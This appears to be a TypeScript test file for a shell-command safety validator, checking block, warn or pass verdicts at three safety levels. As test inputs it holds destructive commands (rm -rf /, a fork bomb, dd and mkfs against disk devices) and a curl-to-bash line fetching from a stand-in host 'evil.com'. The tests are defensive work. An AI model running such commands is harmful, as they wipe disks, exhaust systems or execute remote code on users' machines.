// Phase 3 static analysis tests
// Run: npx tsx test_results/phase3_tests.ts

import { staticAnalysis } from '../src/lib/CommandValidator.ts'
import type { SafetyLevel } from '../src/types/index.ts'

let pass = 0
let fail = 0

function check(label: string, actual: unknown, expected: unknown) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected)
  console.log(`  ${ok ? 'PASS' : 'FAIL'}: ${label}`)
  if (!ok) {
    console.log(`    expected: ${JSON.stringify(expected)}`)
    console.log(`    actual:   ${JSON.stringify(actual)}`)
  }
  ok ? pass++ : fail++
}

// ─── DANGER_ALWAYS (blocked at all levels) ────────────────────────────────────

console.log('\nDANGER_ALWAYS — must block at every safety level:')

for (const level of ['newbie', 'balanced', 'pro'] as SafetyLevel[]) {
  const r1 = staticAnalysis('rm -rf /', level)
  check(`rm -rf / blocked at ${level}`, r1.verdict, 'block')

  const r2 = staticAnalysis(':(){ :|:& };:', level)
  check(`fork bomb blocked at ${level}`, r2.verdict, 'block')

  const r3 = staticAnalysis('dd if=/dev/zero of=/dev/sda', level)
  check(`dd of=/dev blocked at ${level}`, r3.verdict, 'block')

  const r4 = staticAnalysis('mkfs.ext4 /dev/sda1', level)
  check(`mkfs blocked at ${level}`, r4.verdict, 'block')
}

// ─── Network pipe ─────────────────────────────────────────────────────────────

console.log('\nNetwork pipe (curl | bash):')
check('curl|bash blocked at newbie',   staticAnalysis('curl http://evil.com/x.sh | bash', 'newbie').verdict,   'block')
check('curl|bash blocked at balanced', staticAnalysis('curl http://evil.com/x.sh | bash', 'balanced').verdict, 'block')
check('curl|bash warns at pro',        staticAnalysis('curl http://evil.com/x.sh | bash', 'pro').verdict,       'warn')

// ─── sudo rm ─────────────────────────────────────────────────────────────────

console.log('\nsudo rm:')
check('sudo rm blocked at newbie',   staticAnalysis('sudo rm -rf /tmp/test', 'newbie').verdict,   'block')
check('sudo rm blocked at balanced', staticAnalysis('sudo rm -rf /tmp/test', 'balanced').verdict, 'block')
check('sudo rm warns at pro',        staticAnalysis('sudo rm -rf /tmp/test', 'pro').verdict,       'warn')

// ─── Safe commands ────────────────────────────────────────────────────────────

console.log('\nSafe commands:')
for (const level of ['newbie', 'balanced', 'pro'] as SafetyLevel[]) {
  check(`git status passes at ${level}`, staticAnalysis('git status', level).verdict, 'pass')
  check(`ls -la passes at ${level}`,     staticAnalysis('ls -la', level).verdict,     'pass')
}

// ─── git reset --hard ─────────────────────────────────────────────────────────

console.log('\ngit reset --hard:')
check('git reset --hard warns at newbie',   staticAnalysis('git reset --hard HEAD', 'newbie').verdict,   'warn')
check('git reset --hard warns at balanced', staticAnalysis('git reset --hard HEAD', 'balanced').verdict, 'warn')
check('git reset --hard passes at pro',     staticAnalysis('git reset --hard HEAD', 'pro').verdict,      'pass')

// ─── rm -rf (scoped) ─────────────────────────────────────────────────────────

console.log('\nrm -rf (scoped, not root):')
check('rm -rf ./tmp blocked at newbie',   staticAnalysis('rm -rf ./tmp', 'newbie').verdict,   'block')
check('rm -rf ./tmp warns at balanced',   staticAnalysis('rm -rf ./tmp', 'balanced').verdict, 'warn')
check('rm -rf ./tmp passes at pro',       staticAnalysis('rm -rf ./tmp', 'pro').verdict,      'pass')

// ─── Reasons populated ───────────────────────────────────────────────────────

console.log('\nReason strings:')
const blocked = staticAnalysis('rm -rf /', 'balanced')
check('blocked result has reasons', blocked.reasons.length > 0, true)

const warned = staticAnalysis('sudo apt update', 'newbie')
check('warned result has reasons', warned.reasons.length > 0, true)

const safe = staticAnalysis('ls -la', 'balanced')
check('safe result has no reasons', safe.reasons.length, 0)

// ─── Summary ──────────────────────────────────────────────────────────────────

console.log(`\nTotal: ${pass + fail} tests | ${pass} PASS | ${fail} FAIL`)
if (fail > 0) process.exit(1)
